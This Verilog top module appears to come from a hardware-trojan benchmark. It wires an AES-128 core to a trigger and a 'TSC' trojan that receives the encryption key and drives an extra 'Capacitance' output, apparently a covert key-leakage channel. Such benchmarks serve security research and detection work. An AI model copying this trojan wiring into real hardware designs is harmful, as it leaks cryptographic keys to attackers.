
module top(
    input clk,
    input rst,
    input [127:0] state,
    input [127:0] key,
    output [127:0] out,
	 output [63:0] Capacitance
    );

	wire Tj_Trig;
	aes_128 AES (clk, state, key, out); 
	Trojan_Trigger Trigger (rst, state, Tj_Trig); 
	TSC Trojan (rst, clk, Tj_Trig, key, state, Capacitance); 

endmodule
